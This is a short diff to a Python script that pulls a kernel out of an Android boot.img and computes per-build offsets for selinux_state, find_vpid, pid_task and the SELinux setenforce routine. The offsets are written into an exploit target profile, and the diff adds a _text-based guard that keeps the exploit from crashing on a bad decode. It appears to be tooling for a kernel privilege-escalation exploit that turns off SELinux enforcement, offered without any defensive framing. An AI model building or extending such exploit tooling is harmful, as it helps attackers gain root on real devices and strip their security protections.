@@ -156,12 +156,13 @@ def main():
     print("[*] vmlinux-to-elf (deltas: selinux_state, find_vpid, pid_task, ssuse) ...")
     vm = os.path.join(wd, "vmlinux.elf")
     subprocess.run(["vmlinux-to-elf", os.path.join(wd, "boot.img"), vm], capture_output=True)
-    want = ("selinux_state", anchor, "find_vpid", "pid_task", "selinux_status_update_setenforce")
+    want = ("selinux_state", anchor, "find_vpid", "pid_task", "selinux_status_update_setenforce",
+            "_text", "_etext")
     syms = {}
     for l in sh(f"{NM} {vm}").splitlines():
         f = l.split()
         if len(f) == 3 and f[2] in want: syms[f[2]] = int(f[0], 16)
-    miss = [s for s in want if s not in syms]
+    miss = [s for s in want if s not in syms and s not in ("_text", "_etext")]
     if miss: die("missing kernel symbols in vmlinux: " + ",".join(miss))
     pdr = syms[anchor]
     d32 = lambda s: hex((syms[s] - pdr) & 0xffffffff)     # anchor-relative, 32-bit two's complement
@@ -188,6 +189,8 @@ def main():
               "delta_findvpid_from_anchor": d32("find_vpid"),
               "delta_pidtask_from_anchor": d32("pid_task"),
               "delta_ssuse_from_anchor": d32("selinux_status_update_setenforce")}
+    if a.merged and "_text" in syms:        # pdr lower-bound guard (crash-proofs a bad/veneer decode)
+        kernel["delta_text_from_anchor"] = d32("_text")
     tgt = {
         "name": a.name,
         "description": f"build {build}, kernel {vermagic}" + (" (MERGED single-carrier)" if a.merged else ""),
